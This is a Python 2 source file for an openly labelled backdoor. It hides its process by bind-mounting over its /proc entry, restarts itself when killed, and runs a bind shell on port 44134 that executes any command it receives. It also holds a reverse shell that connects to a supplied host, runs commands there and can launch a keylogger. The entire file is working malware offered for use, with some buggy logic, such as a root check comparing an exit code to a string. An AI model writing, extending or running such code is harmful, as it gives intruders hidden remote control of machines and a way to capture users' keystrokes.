#!/usr/bin/python2.7

import socket
# import socks
import urllib2
import sys
import subprocess
import string
import random
import os
import signal
from time import sleep


class Backdoor:

	def relaunch(self, signal, frame):
		cmd = sys.argv
		proc = subprocess.Popen(' '.join(cmd), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
		print "[+] Restarting..."

	def hide_process(self):
		ch = string.uppercase + string.digits
		# Bind mount - works with root on linux
		token = "".join(random.choice(ch) for i in range(32))
		pid = os.getpid()
		print "[+] Current PID: {0}".format(pid)
		if os.path.isdir("/tmp/{0}".format(token)) is False:
			if os.system("sudo whoami") == 'root':
				os.system("sudo mkdir /tmp/{1} && sudo mount -o bind /tmp/{1} /proc/{0}".format(pid,token))

		#Relaunch on kill
		signal.signal(signal.SIGTERM, self.relaunch)

	#Interuot command line to display empty for all commands
	def shell_text_interupt(self, sock, data):
		return sock.send("[{0}]> ".format(data))


	def bind_shell(self, host=None, port=None):

		assert type(host) == str

		if port is None:
			port = int(44134)

		sleep(5)

		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.bind((host,port))
			sock.listen(100)
			while True:
				client, address = sock.accept()
				while True:
					command = client.recv(1024).encode("UTF-8")
					result = os.popen(command).read()
					client.send(result)
					self.shell_text_interupt(client, host)

		except Exception as error:
			print "[-] Failed to create socket: {0}".format(str(error))


	# Default connection port is 44134
	def connect_as_reverse_shell(self, host=None, port=None):

		if host is None:
			return 0

		if port is None:
			port = int(44134)

		sleep(5)

		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.connect((host,port))
			cmd = ""
			while True:
				cmd = sock.recv(1024).encode("UTF-8")
				cmd = cmd.strip("\n")
				#Rootkit specific commands
				if cmd  == "exit":
					sock.close()
				if cmd == "keylogger":
					os.system("nohup python keylogger.py &")
				#Shell commands
				else: 
					proc = subprocess.Popen(cmd, 
					stdout=subprocess.PIPE, 
					stderr=subprocess.PIPE, 
					shell=True)
				proc_out = "{0} {1}\n".format(proc.stdout.read(), proc.stderr.read())
				sock.send(proc_out)
				self.shell_text_interupt(sock, host)
			sock.close()

		except Exception as error:
			print "[-] Failed to create socket: {0}".format(str(error))

		return 0

if __name__ == '__main__':
	bd = Backdoor()
	bd.hide_process()
	bd.bind_shell(sys.argv[1], int(sys.argv[2]))
	bd.connect_as_reverse_shell(str(sys.argv[1]), int(sys.argv[2]))
